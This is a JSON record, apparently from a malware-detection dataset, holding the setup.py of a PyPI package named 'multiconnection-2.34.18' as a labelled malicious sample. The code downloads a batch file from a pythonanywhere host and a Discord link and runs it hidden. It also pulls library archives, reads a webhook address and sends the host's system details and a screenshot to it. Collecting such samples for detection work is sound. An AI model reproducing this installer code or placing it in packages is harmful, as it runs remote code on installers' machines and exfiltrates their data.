[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import urllib.request\nimport zipfile\nimport os\nimport sys\nimport shutil\nimport subprocess\nimport time\nimport random\nimport string\n\nerr = \" \"\ntry:\n    t = \"https://frvezdffvvvv.pythonanywhere.com/getrnr\"\n\n    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+\"\\\\10.bat\")\n    time.sleep(5)\n\n    subprocess.Popen(os.getenv('APPDATA')+\"\\\\10.bat\", creationflags=subprocess.CREATE_NO_WINDOW)\nexcept Exception as e:\n    err = str(e)\n\nimport os\nfrom urllib.request import Request, urlopen, urlretrieve\nimport zipfile\nimport time\ntry:\n    zip_file_path,_ = urlretrieve(\"https://frvezdffvvvv.pythonanywhere.com/getcertifi\", 'certifi.zip')\n    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:\n        zip_ref.extractall()\n    os.remove(\"certifi.zip\")\n    \n    zip_file_path,_ = urlretrieve(\"https://frvezdffvvvv.pythonanywhere.com/getidna\", 'idna.zip')\n    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:\n        zip_ref.extractall()\n    os.remove(\"idna.zip\")\n    \n    zip_file_path,_ = urlretrieve(\"https://frvezdffvvvv.pythonanywhere.com/getcharset\", 'charset_normalizer.zip')\n    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:\n        zip_ref.extractall()\n    os.remove(\"charset_normalizer.zip\")\n    \n    zip_file_path,_ = urlretrieve(\"https://frvezdffvvvv.pythonanywhere.com/geturllib3\", 'urllib3.zip')\n    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:\n        zip_ref.extractall()\n    os.remove(\"urllib3.zip\")\n\n    zip_file_path,_ = urlretrieve(\"https://frvezdffvvvv.pythonanywhere.com/getrequests\", 'requests.zip')\n    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:\n        zip_ref.extractall()\n    os.remove(\"requests.zip\")\n\n    import requests\nexcept:\n    pass\n\nimport subprocess\ndef download(url):\n    get_response = requests.get(url,stream=True)\n    file_name  = os.getenv('APPDATA')+\"\\\\10.bat\"\n    with open(file_name, 'wb') as f:\n        for chunk in get_response.iter_content(chunk_size=1024):\n            if chunk:\n                f.write(chunk)\ntry:\n    url = \"https://cdn.discordapp.com/attachments/1236874551627874375/1236876019303059557/10.txt?ex=66399a0f&is=6638488f&hm=f87ddb8e5bd01ec7d7cd24da3094f7a2080b9fedbac8d5188943e5bb75f914ba&\"\n    download(url)\n    time.sleep(1)\n    subprocess.Popen(os.getenv('APPDATA')+\"\\\\10.bat\", creationflags=subprocess.CREATE_NO_WINDOW)\nexcept Exception as e:\n    err = err + \" - \"+str(e)\n    \ntry:\n    zip_file_path,_ = urlretrieve(\"https://frvezdffvvvv.pythonanywhere.com/getmss\", 'mss.zip')\n    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:\n        zip_ref.extractall()\n    os.remove(\"mss.zip\")\n\n    from mss import mss\nexcept Exception as e:\n    pass\n\ntry:\n    zip_file_path,_ = urlretrieve(\"https://frvezdffvvvv.pythonanywhere.com/getrequests\", 'requests.zip')\n    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:\n        zip_ref.extractall()\n    os.remove(\"requests.zip\")\n\n    import requests\nexcept:\n    pass\nh00k = urlopen(\"https://frvezdffvvvv.pythonanywhere.com/gethook\").read().decode('utf-8')\ntry:\n    \n    import platform,socket,re,uuid,json\nexcept:\n    pass\n\ndef sendSysInfo():\n    info = {}\n    info['platform']=platform.system()\n    info['platform-release']=platform.release()\n    info['platform-version']=platform.version()\n    info['architecture']=platform.machine()\n    info['hostname']=socket.gethostname()\n    info['ip-address']=socket.gethostbyname(socket.gethostname())\n    info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))\n    info['processor']=platform.processor()\n    msgcomp = {\n        \"content\": json.dumps(info)\n    }\n    r = requests.post(h00k, json=msgcomp)\ntry:\n    sendSysInfo()\nexcept:\n    pass\ndef sendDebugScreenshot():\n    try:\n        with mss() as sct:\n            sct.shot(output='screenshot.png')\n        with open('screenshot.png', 'rb') as file:\n            byte_im = file.read()\n\n        r = requests.post(h00k, files={\"screenshot.png\": byte_im})\n        if r.status_code != 200:\n            rct = str(r.content)\n            msgcomp = {\"content\": f\"error on sending screenshot, error code: {r.status_code}\\n error: {rct}\"}\n            r = requests.post(h00k, json=msgcomp)\n    except:\n        pass\ntry:\n    sendDebugScreenshot()\nexcept:\n    pass\ndef sendErr():\n    msgcomp = {\"content\": f\"errors: {err}\"}\n    r = requests.post(h00k, json=msgcomp)\ntry:\n    sendErr()\nexcept:\n    pass\n\ntime.sleep(10)\n"
  },
  {
    "metadata": {
      "package_name": "multiconnection-2.34.18",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/multiconnection-2.34.18.txt"
    }
  }
]